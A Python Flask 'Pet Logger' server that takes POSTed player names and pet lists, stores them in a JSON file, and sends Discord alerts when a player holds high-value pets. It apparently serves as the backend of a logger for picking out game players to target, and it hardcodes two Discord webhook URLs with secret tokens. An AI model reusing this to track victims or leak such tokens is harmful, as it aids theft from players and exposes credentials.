from flask import Flask, request, jsonify
import requests, datetime, json, os

app = Flask(__name__)

# ==================== CONFIG ====================
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1440802864174862531/SixFxy-C9fNq9suB81XpE6ontKSk3YGOmoT-lkn7uQlIt0KBjyhgbH11iSe4OzqkLO-2"
LOW_VALUE_WEBHOOK = "https://discord.com/api/webhooks/1440813903012434112/FRg-sEsrxysrBn3wU_i90NEAXrxanzpIyuD7Qy6BgSu4hP32oOmXh2EoyxnYOTdydm2E"

HIGHLIGHT_MIN = 11_000_000   # ≥11M/s triggers red alert
LOW_VALUE_MAX = 10_999_999

# Render mounts your disk here → /data
STORAGE_DIR = "/data"
JSON_FILE = os.path.join(STORAGE_DIR, "lo.json")

# Create folder + empty file on first start
os.makedirs(STORAGE_DIR, exist_ok=True)
if not os.path.exists(JSON_FILE):
    with open(JSON_FILE, "w") as f:
        json.dump([], f)

# ==================== VALUE PARSER ====================
def parse_value(text):
    if not isinstance(text, str):
        return 0
    text = text.replace("$", "").replace("/s", "").strip().upper()
    mult = 1
    if "K" in text: mult, text = 1_000, text.replace("K", "")
    if "M" in text: mult, text = 1_000_000, text.replace("M", "")
    if "B" in text: mult, text = 1_000_000_000, text.replace("B", "")
    try:
        return int(float(text) * mult)
    except:
        return 0

# ==================== DISCORD ALERTS ====================
def send_highlight(player, pets):
    high = []
    all_pets = []
    for p in pets:
        name = p.get("display_name", "Pet")
        val_raw = p.get("generation", "0")
        all_pets.append(name)
        if parse_value(val_raw) >= HIGHLIGHT_MIN:
            high.append(f"{name} — {val_raw}")
    if not high: return

    embed = {
        "title": "High Value Pet Found!",
        "color": 0xFF0000,
        "fields": [
            {"name": "Player", "value": player},
            {"name": "High Value (≥11M/s)", "value": "\n".join(f"**{x}**" for x in high)},
            {"name": "All Pets", "value": f"```\n{' | '.join(all_pets)}\n```"}
        ],
        "timestamp": datetime.datetime.utcnow().isoformat()
    }
    requests.post(DISCORD_WEBHOOK, json={"embeds": [embed]})

def send_low(player, pets):
    low = [f"{p.get('display_name','Pet')} — {p.get('generation','0')}" 
           for p in pets if parse_value(p.get("generation","0")) <= LOW_VALUE_MAX]
    if not low: return

    embed = {
        "title": "Low Value Pets",
        "color": 0x00AAFF,
        "fields": [
            {"name": "Player", "value": player},
            {"name": "≤10M/s", "value": "\n".join(low)}
        ],
        "timestamp": datetime.datetime.utcnow().isoformat()
    }
    requests.post(LOW_VALUE_WEBHOOK, json={"embeds": [embed]})

# ==================== ROUTES ====================
@app.route("/upload", methods=["POST"])
def upload():
    try:
        data = request.get_json(force=True)
        if not data:
            return jsonify({"error": "No JSON"}), 400

        player = data.get("player", "Unknown")
        pets = data.get("pets", [])
        data["timestamp"] = datetime.datetime.utcnow().isoformat() + "Z"

        send_highlight(player, pets)
        send_low(player, pets)

        # Load → Append → Save
        with open(JSON_FILE, "r") as f:
            logs = json.load(f)
        logs.append(data)
        with open(JSON_FILE, "w") as f:
            json.dump(logs, f, indent=2)

        return jsonify({"status": "ok", "total": len(logs)}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/")
def home():
    try:
        count = len(json.load(open(JSON_FILE)))
    except:
        count = 0
    return jsonify({
        "message": "Pet Logger WS Running on Render",
        "storage": "Persistent Disk (/data)",
        "logs_count": count,
        "time": datetime.datetime.utcnow().isoformat()
    })

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
